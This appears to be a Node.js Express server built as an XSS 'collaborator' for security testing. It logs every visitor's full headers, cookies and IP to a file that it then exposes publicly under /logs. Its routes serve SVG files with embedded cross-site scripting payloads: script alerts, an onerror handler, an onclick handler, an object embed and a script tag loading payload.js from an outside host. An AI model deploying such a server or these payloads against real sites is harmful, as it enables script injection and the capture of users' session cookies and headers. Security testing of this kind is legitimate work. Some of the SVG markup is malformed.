const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Middleware to capture every incoming request
app.use((req, res, next) => {
  const logEntry = {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.originalUrl,
    domain: req.headers.host,
    headers: req.headers,
    cookies: req.cookies,
    ip: req.ip,
  };

  // Log the request data to a file
  const logFilePath = path.join(__dirname, 'request_logs.txt');
  const logText = `\n${logEntry.timestamp} - ${logEntry.method} ${logEntry.url} - Domain: ${logEntry.domain} - IP: ${logEntry.ip} - Headers: ${JSON.stringify(logEntry.headers)} - Cookies: ${JSON.stringify(logEntry.cookies)}\n`;

  // Append the log entry to the file
  fs.appendFile(logFilePath, logText, (err) => {
    if (err) {
      console.error('Error writing log:', err);
    }
  });

  // Continue to the next middleware or route handler
  next();
});

app.get('/image0.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(`<svg xmlns="http://www.w3.org/2000/svg">
  <h1>hi there</h1>
  </svg>
  <script>
    alert("This is a script in an SVG!");
  </script>
  <img src=x onerror=alert(1) />
  <script>
    alert("This is a script in an SVG!");
  />
  
</svg>`);
});

app.get('/image1.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(`<svg xmlns="http://www.w3.org/2000/svg">
  
  
  <script>
    alert("This is a script in an SVG!");
  </script>
  
  
</svg>`);
});

app.get('/image2.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(`<object type="image/svg+xml" data="https://kani-collaborator.onrender.com/image1.svg"></object>`);
});

app.get('/image3.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(`<svg xmlns="http://www.w3.org/2000/svg" onclick="alert('SVG clicked!')">
  <rect width="100" height="100" fill="red"></rect>
</svg>`);
});

app.get('/image4.svg', (req, res) => {
  // Serve JavaScript instead of an image
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(`<svg xmlns="http://www.w3.org/2000/svg" >
  <script src="alertwebsite.ct.ws/payload.js" />
</svg>`);
});


// Serve the request_logs.txt file as a static file (accessible at /logs/request_logs.txt)
app.use('/logs', express.static(path.join(__dirname, '/')));

// Catch-all route to handle any subdomain and log the request
app.get('*', (req, res) => {
  res.status(404).send('Subdomain not found, but the request has been logged.');
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
